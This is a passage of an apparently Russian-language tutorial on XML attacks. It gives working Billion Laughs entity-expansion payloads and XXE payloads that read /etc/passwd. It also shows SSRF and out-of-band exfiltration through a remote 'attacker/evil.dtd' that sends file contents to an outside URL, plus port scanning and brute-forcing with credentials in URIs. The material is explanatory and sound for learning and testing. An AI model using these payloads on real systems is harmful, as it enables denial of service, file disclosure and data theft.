<root>&A;&A;&A;&A;...(a 100.000 &A;'s)...&A;&A;&A;&A;&A;</root>
```

#### Миллиард смешков (Billion Laughs)

**Когда синтаксический анализатор XML попытается разрешить внешние объекты, включенные в приведенный ниже код, это приведет к тому, что приложение начнет использовать всю доступную память, пока процесс не завершится сбоем.** Это пример XML-документа со встроенной схемой [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp), включающей атаку:

```xml
<!DOCTYPE root [
 <!ELEMENT root ANY>
 <!ENTITY LOL "LOL">
 <!ENTITY LOL1 "&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;">
 <!ENTITY LOL2 "&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;">
 <!ENTITY LOL3 "&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;">
 <!ENTITY LOL4 "&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;">
 <!ENTITY LOL5 "&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;">
 <!ENTITY LOL6 "&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;">
 <!ENTITY LOL7 "&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;">
 <!ENTITY LOL8 "&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;">
 <!ENTITY LOL9 "&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;">
]>
<root>&LOL9;</root>
```

Сущность `LOL9` будет разрешена как 10 сущностей, определенных в `LOL8`; затем каждая из этих сущностей будет разрешена в `LOL7` и так далее. Наконец, разбор объектов `3 x 10^ 9` (3 000 000 000), определенных в этой схеме, повлияет на работу процессора и/или памяти, что может привести к сбою синтаксического анализатора.

**Спецификация протокола простого доступа к объектам ([SOAP](https://en.wikipedia.org/wiki/SOAP)) полностью запрещает [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp). Это означает, что обработчик SOAP может отклонить любое сообщение SOAP, содержащее [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp). Несмотря на эту спецификацию, некоторые реализации SOAP анализировали схемы [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) в сообщениях SOAP.**

Следующий пример иллюстрирует случай, когда синтаксический анализатор не следует спецификации, позволяя использовать ссылку на [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) в сообщении SOAP:

```xml
<?XML VERSION="1.0" ENCODING="UTF-8"?>
<!DOCTYPE SOAP-ENV:ENVELOPE [
 <!ELEMENT SOAP-ENV:ENVELOPE ANY>
 <!ATTLIST SOAP-ENV:ENVELOPE ENTITYREFERENCE CDATA #IMPLIED>
 <!ENTITY LOL "LOL">
 <!ENTITY LOL1 "&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;">
 <!ENTITY LOL2 "&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;">
 <!ENTITY LOL3 "&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;">
 <!ENTITY LOL4 "&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;">
 <!ENTITY LOL5 "&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;">
 <!ENTITY LOL6 "&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;">
 <!ENTITY LOL7 "&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;">
 <!ENTITY LOL8 "&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;">
 <!ENTITY LOL9 "&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;">
]>
<SOAP:ENVELOPE ENTITYREFERENCE="&LOL9;"
               XMLNS:SOAP="HTTP://SCHEMAS.XMLSOAP.ORG/SOAP/ENVELOPE/">
 <SOAP:BODY>
  <KEYWORD XMLNS="URN:PARASOFT:WS:STORE">FOO</KEYWORD>
 </SOAP:BODY>
</SOAP:ENVELOPE>
```

#### Поиск отраженного файла

Рассмотрим следующий пример кода XXE:

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE root [
 <!ELEMENT includeme ANY>
 <!ENTITY xxe SYSTEM "/etc/passwd">
]>
<root>&xxe;</root>
```

**Предыдущий XML-файл определяет объект с именем `xxe`, который на самом деле является содержимым файла `/etc/passwd`, который будет расширен в теге `includeme`. Если синтаксический анализатор допускает ссылки на внешние объекты, он может включить содержимое этого файла в XML-ответ или в вывод ошибки.**

#### Подделка запроса на стороне сервера (SSRF)

**Подделка запросов на стороне сервера (CSRF) происходит, когда сервер получает вредоносную XML-схему, которая заставляет сервер извлекать удаленные ресурсы, такие как файл, через HTTP/HTTPS/FTP и т.д.** SRF используется для извлечения удаленных файлов, чтобы подтвердить исполняемый файл, когда вы не можете вернуть файл обратно или выполнять сканирование портов, или проводить атаки методом перебора во внутренних сетях.

##### Разрешение внешнего DNS

**Иногда удается заставить приложение выполнить поиск DNS-данных по произвольным доменным именам на стороне сервера.** Это одна из простейших форм SSRF, но требует от злоумышленника анализа DNS-трафика. В Burp есть плагин, который проверяет наличие этой атаки.

```xml
<!DOCTYPE m PUBLIC "-//B/A/EN" "http://checkforthisspecificdomain.example.com">
```

##### Внешнее подключение

Всякий раз, когда возникает ошибка XXE и вы не можете получить файл, вы можете проверить, сможете ли вы установить удаленные подключения:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
 <!ENTITY % xxe SYSTEM "http://attacker/evil.dtd">
 %xxe;
]>
```

##### Извлечение файлов с помощью объектов-параметров

Параметр entities позволяет извлекать содержимое с помощью URL-ссылок. Рассмотрим следующий вредоносный XML-документ:

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
 <!ENTITY % file SYSTEM "file:///etc/passwd">
 <!ENTITY % dtd SYSTEM "http://attacker/evil.dtd">
 %dtd;
]>
<root>&send;</root>
```

Здесь [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) определяет два внешних параметра: `file` загружает локальный файл и `dtd`, который загружает удаленный [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp). Удаленный [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) должен содержать что-то вроде этого:
 
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY % all "<!ENTITY send SYSTEM 'http://example.com/?%file;'>">
%all;
```

Второй [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) заставляет систему отправлять содержимое "файла" обратно на сервер злоумышленника в качестве параметра URL-адреса.

##### Сканирование портов

Объем и тип информации, генерируемой при сканировании портов, будут зависеть от типа реализации. Ответы могут быть классифицированы следующим образом, от простых до сложных:

**1) Полное раскрытие информации**: Это самый простой и необычный сценарий, при полном раскрытии информации вы можете четко видеть, что происходит, получая полные ответы от запрашиваемого сервера. У вас есть точное представление о том, что произошло при подключении к удаленному хосту.

**2) На основе ошибок**: Если вы не можете увидеть ответ от удаленного сервера, возможно, вы сможете использовать информацию, полученную в результате ответа об ошибке. Представьте, что веб-служба выдает сведения о том, что пошло не так в элементе SOAP Fault при попытке установить соединение:

```text
java.io.IOException: Server returned HTTP response code: 401 for URL: http://192.168.1.1:80
 at sun.net.www.protocol.http.HttpURLConnection.getInputStream(HttpURLConnection.java:1459)
 at com.sun.org.apache.xerces.internal.impl.XMLEntityManager.setupCurrentEntity(XMLEntityManager.java:674)
```

**3) На основе тайм-аута**: Сканер может генерировать тайм-ауты при подключении к открытым или закрытым портам в зависимости от схемы и базовой реализации. Если при попытке подключиться к закрытому порту возникают задержки (которые могут занять одну минуту), то при подключении к действительному порту время ответа будет очень коротким (например, одна секунда). Различия между открытыми и закрытыми портами становятся совершенно очевидными.

**4) Привязка ко времени**: Иногда бывает трудно определить разницу между закрытыми и открытыми портами, поскольку результаты очень малозаметны. Единственный способ с уверенностью узнать статус порта - это провести несколько измерений времени, необходимого для достижения каждого хоста, затем вы должны проанализировать среднее время для каждого порта, чтобы определить статус каждого порта. Этот тип атаки будет трудно осуществить, если она будет осуществляться в сетях с более высокой задержкой.

##### Брутфорсинг

**Как только злоумышленник подтвердит, что можно выполнить сканирование порта, для осуществления атаки методом перебора необходимо ввести "имя пользователя" и "пароль" как часть схемы URI (http, ftp и т.д.).** Например, смотрите следующий пример:

```xml
<!DOCTYPE root [
 <!ENTITY user SYSTEM "http://username:password@example.com:8080">
]>
<root>&user;</root>
```
